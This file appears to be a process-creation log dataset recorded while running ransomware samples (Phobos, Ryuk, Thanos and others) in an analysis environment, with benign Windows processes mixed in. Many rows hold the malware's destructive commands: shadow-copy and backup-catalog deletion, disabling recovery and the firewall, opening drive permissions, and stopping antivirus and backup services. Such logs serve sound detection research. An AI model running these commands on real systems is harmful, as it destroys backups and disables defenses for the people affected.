+24"."mesiponza5"."9480"."7400"."632"."consent.exe"."consent.exe 632 316 0000027DD4C043D0
+24"."mesiponza5"."9936"."2236"."840"."RuntimeBroker.exe"."C:\Windows\System32\RuntimeBroker.exe -Embedding
+24"."mesiponza5"."4368"."7008"."632"."MpCmdRun.exe".""C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2009.7-0\MpCmdRun.exe" -IdleTask -TaskName WdVerification
+24"."mesiponza5"."1484"."7008"."632"."MpCmdRun.exe".""C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2009.7-0\MpCmdRun.exe" -IdleTask -TaskName WdCleanup
+25"."mesiponzi4"."10096"."4488"."632"."dmclient.exe"."C:\Windows\system32\dmclient.exe utcwnf
+25"."mesiponzi4"."6368"."9996"."9948"."OneDrive.exe"." /updateInstalled /background
+25"."mesiponzi4"."4412"."8400"."700"."svchost.exe"."C:\Windows\System32\svchost.exe -k smphost
+25"."mesiponzi4"."6644"."8400"."700"."svchost.exe"."C:\Windows\system32\svchost.exe -k wusvcs -p
+25"."mesiponzi4"."9872"."2644"."664"."MusNotifyIcon.exe"."%systemroot%\system32\MusNotifyIcon.exe NotifyTrayIcon 19
+25"."mesiponzi4"."3416"."6048"."700"."svchost.exe"."C:\Windows\System32\svchost.exe -k NetworkService -p
+25"."mesiponzi4"."9508"."2788"."840"."dllhost.exe"."C:\Windows\system32\DllHost.exe /Processid:{338B40F9-9D68-4B53-A793-6B9AA0C5F63B}
+25"."mesiponzi4"."5240"."7328"."504"."MusNotifyIcon.exe"."%systemroot%\system32\MusNotifyIcon.exe NotifyTrayIcon 19
+25"."mesiponzi4"."1400"."9280"."2912"."MpSigStub.exe"."C:\Windows\TEMP\ED5C789C-E0ED-44A9-BD87-4181876F5C7C\MpSigStub.exe /stub 1.1.17640.0 /payload 4.18.2011.6 /program C:\Windows\SoftwareDistribution\Download\Install\updateplatform.exe
+25"."mesiponzi4"."8620"."2788"."840"."backgroundTaskHost.exe".""C:\Windows\system32\backgroundTaskHost.exe" -ServerName:Microsoft.MicrosoftOfficeHub.AppX54h2e8jwdm50fj5ha8987vz1etpx7czd.mca
+25"."mesiponzi4"."4592"."5380"."840"."backgroundTaskHost.exe".""C:\Windows\system32\backgroundTaskHost.exe" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca
+26"."mesponisa1"."3256"."9296"."4976"."Taskmgr.exe".""C:\Windows\system32\taskmgr.exe" /7
+26"."mesponisa1"."6376"."396"."632"."consent.exe"."consent.exe 632 316 0000027DD4C02F30
+26"."mesponisa1"."2656"."1728"."5172"."cmd.exe"."C:\Windows\system32\cmd.exe /c ""C:\Users\ejaz6\AppData\Local\Temp\update.bat" "
+27"."mountlocker1"."4332"."2788"."840"."backgroundTaskHost.exe".""C:\Windows\system32\backgroundTaskHost.exe" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca
+27"."mountlocker1"."10944"."5380"."840"."backgroundTaskHost.exe".""C:\Windows\system32\BackgroundTaskHost.exe" -ServerName:BackgroundTaskHost.WebAccountProvider
+27"."mountlocker1"."10368"."6072"."840"."backgroundTaskHost.exe".""C:\Windows\system32\BackgroundTaskHost.exe" -ServerName:BackgroundTaskHost.WebAccountProvider
+27"."mountlocker1"."11056"."10848"."3668"."Taskmgr.exe".""C:\Windows\system32\taskmgr.exe" /7
+27"."mountlocker1"."2620"."3208"."632"."consent.exe"."consent.exe 632 316 0000027DD7B02C70
+27"."mountlocker1"."240"."3208"."3668"."Taskmgr.exe".""C:\Windows\system32\taskmgr.exe" /7
+27"."mountlocker1"."8000"."2788"."840"."TiWorker.exe"."C:\Windows\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.19041.441_none_e753a4f1261e4901\TiWorker.exe -Embedding
+27"."mountlocker1"."9960"."1728"."700"."svchost.exe"."C:\Windows\system32\svchost.exe -k wusvcs -p
+27"."mountlocker1"."9720"."3928"."7144"."powershell.exe"."powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+27"."mountlocker1"."10120"."9172"."4888"."MusNotifyIcon.exe"."%systemroot%\system32\MusNotifyIcon.exe NotifyTrayIcon 19
+27"."mountlocker1"."9692"."1728"."700"."svchost.exe"."C:\Windows\System32\svchost.exe -k NetworkService -p
+27"."mountlocker1"."7228"."6072"."840"."dllhost.exe"."C:\Windows\system32\DllHost.exe /Processid:{338B40F9-9D68-4B53-A793-6B9AA0C5F63B}
+27"."mountlocker1"."9428"."10152"."3644"."MusNotifyIcon.exe"."%systemroot%\system32\MusNotifyIcon.exe NotifyTrayIcon 19
+27"."mountlocker1"."9160"."6120"."668"."wuauclt.exe".""C:\Windows\system32\wuauclt.exe" /UpdateDeploymentProvider UpdateDeploymentProvider.dll /ClassId a559c419-21f9-4a68-9324-f1db91f8bc3d /RunHandlerComServer
+27"."mountlocker1"."10684"."264"."4420"."MpSigStub.exe"."C:\Windows\TEMP\582D1056-F4C0-4EAA-B3C8-0EEB0A7A8832\MpSigStub.exe /stub 1.1.17538.0 /payload 4.18.2010.7 /program C:\Windows\SoftwareDistribution\Download\Install\updateplatform.exe
+28"."mountlocker2"."768"."6652"."3504"."CompatTelRunner.exe"."C:\Windows\system32\compattelrunner.exe -m:GeneralTel.dll -f:RunGeneralTelemetry  -cV 6iNUxFZH1kq3alJn.1.3 -SendFullTelemetry -ThrottleUtc
+28"."mountlocker2"."7872"."3704"."3668"."Taskmgr.exe".""C:\Windows\system32\taskmgr.exe" /7
+28"."mountlocker2"."8540"."7316"."632"."consent.exe"."consent.exe 632 316 0000027DD4C064D0
+28"."mountlocker2"."10316"."10276"."1148"."CompatTelRunner.exe"."C:\Windows\system32\compattelrunner.exe -m:aeinv.dll -f:UpdateSoftwareInventoryW
+28"."mountlocker2"."2920"."6048"."700"."svchost.exe"."C:\Windows\System32\svchost.exe -k WerSvcGroup
+28"."mountlocker2"."8144"."5380"."840"."TiWorker.exe"."C:\Windows\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.19041.441_none_e753a4f1261e4901\TiWorker.exe -Embedding
+28"."mountlocker2"."3832"."6148"."668"."UsoClient.exe"."C:\Windows\System32\usoclient.exe PauseStoreUpdates
+28"."mountlocker2"."3224"."1728"."700"."svchost.exe"."C:\Windows\system32\svchost.exe -k wusvcs -p
+28"."mountlocker2"."1948"."6380"."6420"."MusNotifyIcon.exe"."%systemroot%\system32\MusNotifyIcon.exe NotifyTrayIcon 19
+28"."mountlocker2"."8720"."1728"."700"."svchost.exe"."C:\Windows\System32\svchost.exe -k NetworkService -p
+28"."mountlocker2"."9284"."5320"."840"."dllhost.exe"."C:\Windows\system32\DllHost.exe /Processid:{338B40F9-9D68-4B53-A793-6B9AA0C5F63B}
+28"."mountlocker2"."3640"."6132"."4968"."MpSigStub.exe"."C:\Windows\TEMP\0E1D64E0-C5F6-4A2E-B49E-90A8F50782D0\MpSigStub.exe /stub 1.1.17538.0 /payload 4.18.2010.7 /program C:\Windows\SoftwareDistribution\Download\Install\updateplatform.exe
+29"."nemty1"."4344"."6440"."1292"."CompatTelRunner.exe"."C:\Windows\system32\compattelrunner.exe -m:GeneralTel.dll -f:RunGeneralTelemetry  -cV mItCPYfSj0CfQBET.1.3 -SendFullTelemetry -ThrottleUtc
+29"."nemty1"."6080"."2196"."1148"."CompatTelRunner.exe"."C:\Windows\system32\compattelrunner.exe -m:aeinv.dll -f:UpdateSoftwareInventoryW
+30"."nemty2"."580"."4300"."5948"."DismHost.exe"."C:\Windows\TEMP\3BEDDF9D-769B-4EC8-A4FB-3991DA8D0896\dismhost.exe {E67BEDB0-0C0C-49FD-AEC5-F2548B310232}
+30"."nemty2"."5004"."2788"."840"."dllhost.exe"."C:\Windows\system32\DllHost.exe /Processid:{3AD05575-8857-4850-9277-11B85BDB8E09}
+31"."netwalker"."9284"."4964"."4644"."SearchProtocolHost.exe".""C:\Windows\system32\SearchProtocolHost.exe" Global\UsGthrFltPipeMssGthrPipe4_ Global\UsGthrCtrlFltPipeMssGthrPipe4 1 -2147483646 "Software\Microsoft\Windows Search" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)" "C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc" "DownLevelDaemon"
+31"."netwalker"."7408"."4964"."4644"."SearchFilterHost.exe".""C:\Windows\system32\SearchFilterHost.exe" 0 792 796 804 8192 800 776
+32"."netwalker2"."5864"."5984"."4248"."Taskmgr.exe".""C:\Windows\system32\taskmgr.exe" /7
+32"."netwalker2"."7408"."2392"."1204"."consent.exe"."consent.exe 1204 316 0000021985D02A00
+32"."netwalker2"."7772"."2392"."4248"."Taskmgr.exe".""C:\Windows\system32\taskmgr.exe" /7
+32"."netwalker2"."7792"."2524"."2288"."MpCmdRun.exe".""C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2007.8-0\MpCmdRun.exe" SignatureUpdate -ScheduleJob -RestrictPrivileges
+32"."netwalker2"."800"."2524"."2288"."MpCmdRun.exe".""C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2007.8-0\MpCmdRun.exe" Scan -ScheduleJob -RestrictPrivileges -ScanType 1 -ScanTrigger 59
+32"."netwalker2"."3212"."4676"."7792"."MpCmdRun.exe".""C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2007.8-0\MpCmdRun.exe" SignatureUpdate -ScheduleJob -RestrictPrivileges -Reinvoke
+32"."netwalker2"."3904"."3812"."800"."MpCmdRun.exe".""C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2007.8-0\MpCmdRun.exe" Scan -ScheduleJob -RestrictPrivileges -ScanType 1 -ScanTrigger 59 -Reinvoke
+32"."netwalker2"."7244"."2608"."2288"."MpCmdRun.exe".""C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2007.8-0\MpCmdRun.exe" SignaturesUpdateService -ScheduleJob -UnmanagedUpdate
+32"."netwalker2"."6012"."7752"."1204"."wuauclt.exe".""C:\Windows\system32\wuauclt.exe" /UpdateDeploymentProvider UpdateDeploymentProvider.dll /ClassId 140c853b-0c28-46f6-93b9-df7721edc037 /RunHandlerComServer
+32"."netwalker2"."7308"."6080"."5416"."MpSigStub.exe"."C:\Windows\TEMP\49B1F202-43F6-40B9-90FC-A0235448AFD4\MpSigStub.exe /stub 1.1.17200.4 /payload 4.18.2009.7 /program C:\Windows\SoftwareDistribution\Download\Install\updateplatform.exe
+33"."phobos"."10788"."8072"."10688"."LocalBridge.exe".""C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_18.2008.12711.0_x64__8wekyb3d8bbwe\LocalBridge.exe" /InvokerPRAID: Microsoft.MicrosoftOfficeHub notifications
+33"."phobos"."11028"."9104"."1980"."SIHClient.exe"."C:\Windows\System32\sihclient.exe  /cv 58oEC07IrEicHJ30pduGeA.0.2
+33"."phobos"."3496"."7260"."8656"."netsh.exe"."netsh  advfirewall set currentprofile state off
+33"."phobos"."10948"."7268"."2212"."vssadmin.exe"."vssadmin  delete shadows /all /quiet
+33"."phobos"."11088"."7268"."2212"."WMIC.exe"."wmic  shadowcopy delete
+33"."phobos"."7320"."7268"."2212"."bcdedit.exe"."bcdedit  /set {default} bootstatuspolicy ignoreallfailures
+33"."phobos"."7772"."7268"."2212"."bcdedit.exe"."bcdedit  /set {default} recoveryenabled no
+33"."phobos"."6896"."7268"."2212"."wbadmin.exe"."wbadmin  delete catalog -quiet
+33"."phobos"."11144"."2788"."840"."vdsldr.exe"."C:\Windows\System32\vdsldr.exe -Embedding
+33"."phobos"."10992"."7260"."8656"."netsh.exe"."netsh  firewall set opmode mode=disable
+33"."phobos"."8680"."3128"."1148"."CompatTelRunner.exe"."C:\Windows\system32\compattelrunner.exe -m:aeinv.dll -f:UpdateSoftwareInventoryW
+34"."ragnarlocker1"."4052"."2384"."8740"."WMIC.exe"."wmic.exe shadowcopy delete
+34"."ragnarlocker1"."3868"."2384"."8740"."vssadmin.exe"."vssadmin delete shadows /all /quiet
+34"."ragnarlocker1"."9192"."4964"."4644"."SearchFilterHost.exe".""C:\Windows\system32\SearchFilterHost.exe" 0 792 796 804 8192 800 776
+34"."ragnarlocker1"."8812"."9012"."9104"."MpSigStub.exe"."C:\Windows\system32\MpSigStub.exe /stub 1.1.17600.2 /payload 1.325.0.0 /MpWUStub /program C:\Windows\SoftwareDistribution\Download\Install\AM_Base.exe
+34"."ragnarlocker1"."8600"."7828"."840"."backgroundTaskHost.exe".""C:\Windows\system32\BackgroundTaskHost.exe" -ServerName:BackgroundTaskHost.WebAccountProvider
+34"."ragnarlocker1"."8444"."2584"."4240"."AM_Delta.exe".""C:\Windows\SoftwareDistribution\Download\Install\AM_Delta.exe" WD /q
+34"."ragnarlocker1"."2864"."3512"."2204"."Taskmgr.exe".""C:\Windows\system32\taskmgr.exe" /6
+34"."ragnarlocker1"."6668"."3600"."632"."consent.exe"."consent.exe 632 316 0000027DC86F25E0
+34"."ragnarlocker1"."3808"."3600"."4692"."Taskmgr.exe".""C:\Windows\system32\taskmgr.exe" /6
+35"."ragnarlocker2"."7156"."3228"."5600"."MusNotificationUx.exe"."%systemroot%\system32\MusNotificationUx.exe Dialog_EngagedFourthReminder 0
+35"."ragnarlocker2"."1616"."3228"."5600"."MusNotifyIcon.exe"."%systemroot%\system32\MusNotifyIcon.exe NotifyTrayIcon 19
+35"."ragnarlocker2"."6728"."8792"."8736"."bcdedit.exe"."bcdedit /set {globalsettings} advancedoptions false
+35"."ragnarlocker2"."3636"."4276"."840"."SecurityHealthHost.exe"."C:\Windows\System32\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding
+35"."ragnarlocker2"."5868"."7140"."700"."svchost.exe"."C:\Windows\System32\svchost.exe -k WerSvcGroup
+35"."ragnarlocker2"."7284"."8940"."1724"."MusNotifyIcon.exe"."%systemroot%\system32\MusNotifyIcon.exe NotifyTrayIcon 13
+35"."ragnarlocker2"."860"."4256"."760"."MusNotifyIcon.exe"."%systemroot%\system32\MusNotifyIcon.exe NotifyTrayIcon 13
+35"."ragnarlocker2"."6064"."4468"."8380"."MpSigStub.exe".""C:\Windows\SoftwareDistribution\Download\Install\MpSigStub.exe" /Store
+36"."ransom_umnamed"."8876"."4964"."4644"."SearchProtocolHost.exe".""C:\Windows\system32\SearchProtocolHost.exe" Global\UsGthrFltPipeMssGthrPipe4_ Global\UsGthrCtrlFltPipeMssGthrPipe4 1 -2147483646 "Software\Microsoft\Windows Search" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)" "C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc" "DownLevelDaemon"
+36"."ransom_umnamed"."6440"."4964"."4644"."SearchFilterHost.exe".""C:\Windows\system32\SearchFilterHost.exe" 0 792 796 804 8192 800 776
+36"."ransom_umnamed"."7644"."2784"."1480"."csc.exe".""C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\ejaz6\AppData\Local\Temp\k44lm4g2.cmdline"
+36"."ransom_umnamed"."4836"."8592"."7644"."cvtres.exe"."C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ejaz6\AppData\Local\Temp\RESB12E.tmp" "c:\Users\ejaz6\AppData\Local\Temp\CSCCADD9DFB17804C949391BE905DC178A1.TMP"
+36"."ransom_umnamed"."6152"."6220"."5320"."csc.exe".""C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\ejaz6\AppData\Local\Temp\clya4hua.cmdline"
+36"."ransom_umnamed"."4888"."6236"."6152"."cvtres.exe"."C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ejaz6\AppData\Local\Temp\RESCA10.tmp" "c:\Users\ejaz6\AppData\Local\Temp\CSCE9CE21279A5B412E9C66A4154E0DFA1.TMP"
+36"."ransom_umnamed"."8656"."4324"."2452"."MpCmdRun.exe".""C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2007.8-0\MpCmdRun.exe" Scan -ScheduleJob -RestrictPrivileges -ScanType 1 -ScanTrigger 59
+36"."ransom_umnamed"."7080"."2188"."8656"."MpCmdRun.exe".""C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2007.8-0\MpCmdRun.exe" Scan -ScheduleJob -RestrictPrivileges -ScanType 1 -ScanTrigger 59 -Reinvoke
+36"."ransom_umnamed"."7776"."4556"."632"."taskhostw.exe"."taskhostw.exe -RegisterDevice -ProtectionStateChanged -FreeNetworkOnly
+36"."ransom_umnamed"."1984"."8044"."840"."WmiPrvSE.exe"."C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding
+36"."ransom_umnamed"."3084"."2408"."840"."SecurityHealthHost.exe"."C:\Windows\System32\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding
+36"."ransom_umnamed"."7088"."8044"."840"."SecurityHealthHost.exe"."C:\Windows\System32\SecurityHealthHost.exe {E041C90B-68BA-42C9-991E-477B73A75C90} -Embedding
+39"."ranzy3"."10084"."1980"."840"."backgroundTaskHost.exe".""C:\Windows\system32\backgroundTaskHost.exe" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca
+41"."ryuk2"."7220"."4324"."2452"."MpCmdRun.exe".""C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2007.8-0\MpCmdRun.exe" Scan -ScheduleJob -RestrictPrivileges -ScanType 1 -ScanTrigger 59
+41"."ryuk2"."392"."1900"."7220"."MpCmdRun.exe".""C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2007.8-0\MpCmdRun.exe" Scan -ScheduleJob -RestrictPrivileges -ScanType 1 -ScanTrigger 59 -Reinvoke
+41"."ryuk2"."1752"."8828"."632"."taskhostw.exe"."taskhostw.exe -RegisterDevice -ProtectionStateChanged -FreeNetworkOnly
+41"."ryuk2"."5956"."8108"."5260"."KftKDYOLWlan.exe".""C:\Users\ejaz6\OneDrive\Desktop\Ryuk\KftKDYOLWlan.exe" 8 LAN
+41"."ryuk2"."8512"."4964"."4644"."SearchProtocolHost.exe".""C:\Windows\system32\SearchProtocolHost.exe" Global\UsGthrFltPipeMssGthrPipe4_ Global\UsGthrCtrlFltPipeMssGthrPipe4 1 -2147483646 "Software\Microsoft\Windows Search" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)" "C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc" "DownLevelDaemon"
+41"."ryuk2"."5264"."4964"."4644"."SearchFilterHost.exe".""C:\Windows\system32\SearchFilterHost.exe" 0 792 796 804 8192 800 776
+41"."ryuk2"."5076"."8108"."5260"."bsWGfyImTlan.exe".""C:\Users\ejaz6\OneDrive\Desktop\Ryuk\bsWGfyImTlan.exe" 8 LAN
+41"."ryuk2"."628"."8108"."5260"."Wpiohsutslan.exe".""C:\Users\ejaz6\OneDrive\Desktop\Ryuk\Wpiohsutslan.exe" 8 LAN
+41"."ryuk2"."4744"."3820"."5260"."taskkill.exe".""C:\Windows\System32\taskkill.exe" /IM sqlwriter.exe /F
+41"."ryuk2"."5004"."8108"."5260"."icacls.exe"."icacls "C:\*" /grant Everyone:F /T /C /Q
+41"."ryuk2"."6908"."8108"."5260"."icacls.exe"."icacls "D:\*" /grant Everyone:F /T /C /Q
+41"."ryuk2"."3880"."8108"."5260"."icacls.exe"."icacls "Z:\*" /grant Everyone:F /T /C /Q
+41"."ryuk2"."3772"."7916"."5260"."taskkill.exe".""C:\Windows\System32\taskkill.exe" /IM sqlwriter.exe /F
+41"."ryuk2"."5360"."2408"."840"."SecurityHealthHost.exe"."C:\Windows\System32\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding
+41"."ryuk2"."7192"."9024"."840"."SecurityHealthHost.exe"."C:\Windows\System32\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding
+42"."ryuk3"."7940"."5168"."824"."WmiPrvSE.exe"."C:\Windows\system32\wbem\wmiprvse.exe -Embedding
+42"."ryuk3"."7924"."6232"."8152"."icacls.exe"."icacls "C:\*" /grant Everyone:F /T /C /Q
+42"."ryuk3"."2052"."6232"."8152"."icacls.exe"."icacls "D:\*" /grant Everyone:F /T /C /Q
+42"."ryuk3"."2468"."6232"."8152"."icacls.exe"."icacls "Z:\*" /grant Everyone:F /T /C /Q
+43"."ryuk4"."4632"."1448"."832"."WmiPrvSE.exe"."C:\Windows\system32\wbem\wmiprvse.exe -Embedding
+43"."ryuk4"."4276"."940"."832"."TextInputHost.exe".""C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\InputApp\TextInputHost.exe" -ServerName:InputApp.AppX9jnwykgrccxc8by3hsrsh07r423xzvav.mca
+43"."ryuk4"."7012"."5412"."832"."dllhost.exe"."C:\Windows\system32\DllHost.exe /Processid:{7966B4D8-4FDC-4126-A10B-39A3209AD251}
+43"."ryuk4"."8164"."5412"."832"."dllhost.exe"."C:\Windows\system32\DllHost.exe /Processid:{973D20D7-562D-44B9-B70B-5A0F49CCDF3F}
+43"."ryuk4"."3884"."7232"."3744"."Taskmgr.exe".""C:\Windows\system32\taskmgr.exe" /7
+43"."ryuk4"."412"."3860"."776"."consent.exe"."consent.exe 776 316 0000027553E31020
+43"."ryuk4"."7820"."3860"."3744"."Taskmgr.exe".""C:\Windows\system32\taskmgr.exe" /7
+43"."ryuk4"."4068"."2484"."776"."sc.exe"."C:\Windows\system32\sc.exe start pushtoinstall registration
+43"."ryuk4"."2740"."5672"."7772"."icacls.exe"."icacls "C:\*" /grant Everyone:F /T /C /Q
+43"."ryuk4"."4980"."5672"."7772"."icacls.exe"."icacls "D:\*" /grant Everyone:F /T /C /Q
+43"."ryuk4"."3168"."5672"."7772"."icacls.exe"."icacls "Z:\*" /grant Everyone:F /T /C /Q
+43"."ryuk4"."7660"."3456"."776"."WMIADAP.exe"."wmiadap.exe /F /T /R
+43"."ryuk4"."6304"."1012"."832"."SecurityHealthHost.exe"."C:\Windows\System32\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding
+44"."ryuk5"."8940"."8840"."8436"."MusNotifyIcon.exe"."%systemroot%\system32\MusNotifyIcon.exe NotifyTrayIcon 13
+44"."ryuk5"."3768"."3256"."632"."wermgr.exe"."C:\Windows\system32\wermgr.exe -upload
+44"."ryuk5"."8352"."7416"."632"."wermgr.exe"."C:\Windows\system32\wermgr.exe -upload
+44"."ryuk5"."8956"."6160"."632"."327da452b8c86ed8910056646771de8fb92a928c3d135efb2d41e6cb26806382.exe"."C:\Users\ejaz6\OneDrive\Desktop\Ryuk\327da452b8c86ed8910056646771de8fb92a928c3d135efb2d41e6cb26806382.exe 4028878378
+44"."ryuk5"."8160"."5188"."7812"."wuauclt.exe".""C:\Windows\system32\wuauclt.exe" /UpdateDeploymentProvider UpdateDeploymentProvider.dll /ClassId b6893226-e1c5-4862-8714-a40416695b07 /RunHandlerComServer
+44"."ryuk5"."4328"."8252"."8160"."MpSigStub.exe".""C:\Windows\SoftwareDistribution\Download\Install\MpSigStub.exe" /Store
+44"."ryuk5"."7660"."8252"."8160"."AM_Engine.exe".""C:\Windows\SoftwareDistribution\Download\Install\AM_Engine.exe" /LastPackage
+44"."ryuk5"."8528"."6860"."7660"."MpSigStub.exe"."C:\Windows\system32\MpSigStub.exe /stub 1.1.17600.2 /payload 1.1.17500.4 /MpWUStub /program C:\Windows\SoftwareDistribution\Download\Install\AM_Engine.exe /LastPackage
+46"."Thanos"."6704"."9112"."8736"."rundll32.exe"."rundll32 C:\Windows\system32\GeneralTel.dll,RunInUserCxt 8zWnhWXB/km4icqb.1.2.2 {4BC13D59-912B-4586-9B2E-1138BE403E27} {9751E73F-FB21-EF33-47B6-1E1E1E47DF8F} IsAdmin WAMAccountCount
+46"."Thanos"."5548"."6120"."6760"."net.exe".""net.exe" stop avpsus /y
+46"."Thanos"."8384"."6120"."6760"."net.exe".""net.exe" stop McAfeeDLPAgentService /y
+46"."Thanos"."8516"."6120"."6760"."net.exe".""net.exe" stop mfewc /y
+46"."Thanos"."8512"."6120"."6760"."net.exe".""net.exe" stop BMR Boot Service /y
+46"."Thanos"."8076"."6120"."6760"."net.exe".""net.exe" stop NetBackup BMR MTFTP Service /y
+46"."Thanos"."7892"."6120"."6760"."net.exe".""net.exe" stop DefWatch /y
+46"."Thanos"."8144"."6120"."6760"."net.exe".""net.exe" stop ccEvtMgr /y
+46"."Thanos"."8936"."6120"."6760"."net.exe".""net.exe" stop ccSetMgr /y
+46"."Thanos"."6944"."6120"."6760"."net.exe".""net.exe" stop SavRoam /y
+46"."Thanos"."424"."6120"."6760"."net.exe".""net.exe" stop RTVscan /y
+46"."Thanos"."1540"."6120"."6760"."net.exe".""net.exe" stop QBFCService /y
+46"."Thanos"."6428"."6120"."6760"."net.exe".""net.exe" stop QBIDPService /y
+46"."Thanos"."8112"."6120"."6760"."net.exe".""net.exe" stop Intuit.QuickBooks.FCS /y
+46"."Thanos"."6020"."6120"."6760"."net.exe".""net.exe" stop QBCFMonitorService /y
+46"."Thanos"."6960"."6120"."6760"."net.exe".""net.exe" stop YooBackup /y
+46"."Thanos"."5316"."6120"."6760"."net.exe".""net.exe" stop YooIT /y
+46"."Thanos"."8972"."6120"."6760"."net.exe".""net.exe" stop zhudongfangyu /y
+46"."Thanos"."6064"."6120"."6760"."net.exe".""net.exe" stop stc_raw_agent /y
+46"."Thanos"."8188"."6120"."6760"."net.exe".""net.exe" stop VSNAPVSS /y
+46"."Thanos"."2076"."6120"."6760"."net.exe".""net.exe" stop VeeamTransportSvc /y
+46"."Thanos"."3816"."6120"."6760"."net.exe".""net.exe" stop VeeamDeploymentService /y
+46"."Thanos"."1400"."6120"."6760"."net.exe".""net.exe" stop VeeamNFSSvc /y
+46"."Thanos"."3792"."6120"."6760"."net.exe".""net.exe" stop veeam /y
+46"."Thanos"."8644"."6120"."6760"."net.exe".""net.exe" stop PDVFSService /y
+46"."Thanos"."792"."6120"."6760"."net.exe".""net.exe" stop BackupExecVSSProvider /y
+46"."Thanos"."4476"."6120"."6760"."net.exe".""net.exe" stop BackupExecAgentAccelerator /y
+46"."Thanos"."9024"."6120"."6760"."net.exe".""net.exe" stop BackupExecAgentBrowser /y
+46"."Thanos"."5612"."6120"."6760"."net.exe".""net.exe" stop BackupExecDiveciMediaService /y
+46"."Thanos"."9160"."6120"."6760"."net.exe".""net.exe" stop BackupExecJobEngine /y
+46"."Thanos"."5108"."6120"."6760"."net.exe".""net.exe" stop BackupExecManagementService /y
+46"."Thanos"."8776"."6120"."6760"."net.exe".""net.exe" stop BackupExecRPCService /y
+46"."Thanos"."6992"."6120"."6760"."net.exe".""net.exe" stop AcrSch2Svc /y
+46"."Thanos"."2612"."6120"."6760"."net.exe".""net.exe" stop AcronisAgent /y
+46"."Thanos"."7544"."6120"."6760"."net.exe".""net.exe" stop CASAD2DWebSvc /y
+46"."Thanos"."8772"."6120"."6760"."net.exe".""net.exe" stop CAARCUpdateSvc /y
+46"."Thanos"."8696"."6120"."6760"."net.exe".""net.exe" stop sophos /y
+46"."Thanos"."3632"."6120"."6760"."sc.exe".""sc.exe" config SQLTELEMETRY start= disabled
+46"."Thanos"."7024"."6120"."6760"."sc.exe".""sc.exe" config SQLTELEMETRY$ECWDB2 start= disabled
+46"."Thanos"."1788"."6120"."6760"."sc.exe".""sc.exe" config SQLWriter start= disabled
+46"."Thanos"."7160"."6120"."6760"."sc.exe".""sc.exe" config SstpSvc start= disabled
+46"."Thanos"."232"."6120"."6760"."taskkill.exe".""taskkill.exe" /IM mspub.exe /F
+46"."Thanos"."5488"."6120"."6760"."taskkill.exe".""taskkill.exe" /IM mydesktopqos.exe /F
+46"."Thanos"."1568"."6120"."6760"."taskkill.exe".""taskkill.exe" /IM mydesktopservice.exe /F
+46"."Thanos"."9504"."8072"."8112"."net1.exe"."C:\Windows\system32\net1 stop Intuit.QuickBooks.FCS /y
+46"."Thanos"."9624"."8528"."6064"."net1.exe"."C:\Windows\system32\net1 stop stc_raw_agent /y
+46"."Thanos"."9744"."6496"."8076"."net1.exe"."C:\Windows\system32\net1 stop NetBackup BMR MTFTP Service /y
+46"."Thanos"."9816"."5004"."1400"."net1.exe"."C:\Windows\system32\net1 stop VeeamNFSSvc /y
+46"."Thanos"."9824"."856"."6020"."net1.exe"."C:\Windows\system32\net1 stop QBCFMonitorService /y
+46"."Thanos"."9832"."440"."3816"."net1.exe"."C:\Windows\system32\net1 stop VeeamDeploymentService /y
+46"."Thanos"."9840"."8152"."7544"."net1.exe"."C:\Windows\system32\net1 stop CASAD2DWebSvc /y
+46"."Thanos"."9856"."6240"."6944"."net1.exe"."C:\Windows\system32\net1 stop SavRoam /y
+46"."Thanos"."9864"."7124"."5612"."net1.exe"."C:\Windows\system32\net1 stop BackupExecDiveciMediaService /y
+46"."Thanos"."9872"."8108"."6428"."net1.exe"."C:\Windows\system32\net1 stop QBIDPService /y
+46"."Thanos"."9880"."8968"."5316"."net1.exe"."C:\Windows\system32\net1 stop YooIT /y
+46"."Thanos"."9888"."6364"."7892"."net1.exe"."C:\Windows\system32\net1 stop DefWatch /y
+46"."Thanos"."9908"."2496"."8384"."net1.exe"."C:\Windows\system32\net1 stop McAfeeDLPAgentService /y
+46"."Thanos"."9920"."6216"."2076"."net1.exe"."C:\Windows\system32\net1 stop VeeamTransportSvc /y
